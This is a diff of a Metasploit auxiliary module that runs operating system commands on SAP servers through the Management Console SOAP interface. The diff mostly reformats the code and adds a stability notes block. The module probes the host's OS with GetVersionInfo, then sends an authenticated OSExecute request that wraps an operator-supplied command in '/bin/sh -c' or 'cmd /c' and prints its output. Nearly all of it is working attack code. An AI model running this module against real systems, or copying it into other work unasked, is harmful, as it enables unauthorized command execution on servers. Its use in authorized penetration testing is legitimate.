@@ -10,19 +10,23 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'SAP Management Console OSExecute',
-      'Description'  => %q{
+      'Name' => 'SAP Management Console OSExecute',
+      'Description' => %q{
         This module allows execution of operating system commands through the SAP
         Management Console SOAP Interface. A valid username and password must be
         provided.
-        },
-      'References'   =>
-        [
-          # General
-          [ 'URL', 'http://blog.c22.cc' ]
-        ],
-      'Author'       => [ 'Chris John Riley' ],
-      'License'      => MSF_LICENSE
+      },
+      'References' => [
+        # General
+        [ 'URL', 'http://blog.c22.cc' ]
+      ],
+      'Author' => [ 'Chris John Riley' ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -32,65 +36,65 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpUsername', [true, 'Username to use', '']),
         OptString.new('HttpPassword', [true, 'Password to use', '']),
         OptString.new('CMD', [true, 'Command to run', 'set']),
-      ])
+      ]
+    )
     register_autofilter_ports([ 50013 ])
   end
 
   def run_host(ip)
     # Check version information to confirm Win/Lin
 
-    soapenv='http://schemas.xmlsoap.org/soap/envelope/'
-    xsi='http://www.w3.org/2001/XMLSchema-instance'
-    xs='http://www.w3.org/2001/XMLSchema'
-    sapsess='http://www.sap.com/webas/630/soap/features/session/'
-    ns1='ns1:GetVersionInfo' # Using GetVersionInfo to enumerate target type
+    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
+    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
+    xs = 'http://www.w3.org/2001/XMLSchema'
+    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
+    ns1 = 'ns1:GetVersionInfo' # Using GetVersionInfo to enumerate target type
 
     data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
-    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' +	 soapenv
+    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv
     data << '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
     data << '<SOAP-ENV:Header>' + "\r\n"
-    data << '<sapsess:Session xlmns:sapsess="' +  sapsess + '">' + "\r\n"
+    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
     data << '<enableSession>true</enableSession>' + "\r\n"
     data << '</sapsess:Session>' + "\r\n"
     data << '</SOAP-ENV:Header>' + "\r\n"
     data << '<SOAP-ENV:Body>' + "\r\n"
-    data << '<'+ ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 +'>' + "\r\n"
+    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
     data << '</SOAP-ENV:Body>' + "\r\n"
     data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
 
-    print_status("[SAP] Attempting to enumerate remote host type")
+    print_status('[SAP] Attempting to enumerate remote host type')
 
     begin
       res = send_request_raw({
-        'uri'     => normalize_uri(datastore['URI']),
-        'method'  => 'POST',
-        'data'    => data,
+        'uri' => normalize_uri(datastore['URI']),
+        'method' => 'POST',
+        'data' => data,
         'headers' =>
           {
-            'Content-Length'  => data.length,
-            'SOAPAction'      => '""',
-            'Content-Type'    => 'text/xml; charset=UTF-8',
+            'Content-Length' => data.length,
+            'SOAPAction' => '""',
+            'Content-Type' => 'text/xml; charset=UTF-8'
           }
       }, 60)
-
     rescue ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} [SAP] Unable to communicate")
       return :abort
     end
 
-    if not res
+    if !res
       print_error("#{rhost}:#{rport} [SAP] Unable to connect")
       return
     elsif res.code == 200
       body = res.body
       if body.match(/linux/i)
-        print_status("[SAP] Linux target detected")
+        print_status('[SAP] Linux target detected')
         cmd_to_run = '/bin/sh -c ' + datastore['CMD']
       elsif body.match(/NT/)
-        print_status("[SAP] Windows target detected")
+        print_status('[SAP] Windows target detected')
         cmd_to_run = 'cmd /c ' + datastore['CMD']
       else
-        print_status("[SAP] Unknown target detected, defaulting to *nix syntax")
+        print_status('[SAP] Unknown target detected, defaulting to *nix syntax')
         cmd_to_run = '/bin/sh -c ' + datastore['CMD']
       end
     end
@@ -99,7 +103,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def osexecute(rhost, cmd_to_run)
-
     print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
     success = false
 
@@ -123,45 +126,44 @@ class MetasploitModule < Msf::Auxiliary
     data << '</SOAP-ENV:Body>' + "\r\n"
     data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
 
-    user_pass = Rex::Text.encode_base64(datastore['HttpUsername'] + ":" + datastore['HttpPassword'])
+    user_pass = Rex::Text.encode_base64(datastore['HttpUsername'] + ':' + datastore['HttpPassword'])
 
     begin
       res = send_request_raw({
-        'uri'     => normalize_uri(datastore['URI']),
-        'method'  => 'POST',
-        'data'    => data,
+        'uri' => normalize_uri(datastore['URI']),
+        'method' => 'POST',
+        'data' => data,
         'headers' =>
           {
-            'Content-Length'  => data.length,
-            'SOAPAction'      => '""',
-            'Authorization'   => 'Basic ' + user_pass,
-            'Content-Type'    => 'text/xml; charset=UTF-8',
+            'Content-Length' => data.length,
+            'SOAPAction' => '""',
+            'Authorization' => 'Basic ' + user_pass,
+            'Content-Type' => 'text/xml; charset=UTF-8'
           }
       }, 60)
 
-      if res and res.code == 200
+      if res && (res.code == 200)
         success = true
-        body = CGI::unescapeHTML(res.body)
-        if body.match(/<exitcode>(.*)<\/exitcode>/i)
-          exitcode = $1.to_i
+        body = CGI.unescapeHTML(res.body)
+        if body.match(%r{<exitcode>(.*)</exitcode>}i)
+          exitcode = ::Regexp.last_match(1).to_i
         end
-        if body.match(/<pid>(.*)<\/pid>/i)
-          pid = $1.strip
+        if body.match(%r{<pid>(.*)</pid>}i)
+          pid = ::Regexp.last_match(1).strip
         end
-        if body.match(/<lines>(.*)<\/lines>/i)
-          items = body.scan(/<item>(.*?)<\/item>/i)
+        if body.match(%r{<lines>(.*)</lines>}i)
+          items = body.scan(%r{<item>(.*?)</item>}i)
         end
-      elsif res and res.code == 500
+      elsif res && (res.code == 500)
         case res.body
-        when /<faultstring>(.*)<\/faultstring>/i
-          faultcode = "#{$1}"
+        when %r{<faultstring>(.*)</faultstring>}i
+          faultcode = ::Regexp.last_match(1).to_s
           fault = true
         end
       else
         print_error("#{rhost}:#{rport} [SAP] Unknown response received")
         return
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
       return :abort
@@ -176,16 +178,16 @@ class MetasploitModule < Msf::Auxiliary
 
       saptbl = Msf::Ui::Console::Table.new(
         Msf::Ui::Console::Table::Style::Default,
-          'Header'  => '[SAP] OSExecute',
-          'Prefix'  => "\n",
-          'Columns' => [ 'Command output' ]
-        )
+        'Header' => '[SAP] OSExecute',
+        'Prefix' => "\n",
+        'Columns' => [ 'Command output' ]
+      )
 
       items.each do |output|
         saptbl << [ output[0] ]
       end
 
-      print_good("#{rhost}:#{rport} [SAP] Command (#{cmd_to_run}) ran as PID: #{pid}\n#{saptbl.to_s}")
+      print_good("#{rhost}:#{rport} [SAP] Command (#{cmd_to_run}) ran as PID: #{pid}\n#{saptbl}")
 
     elsif fault
       print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
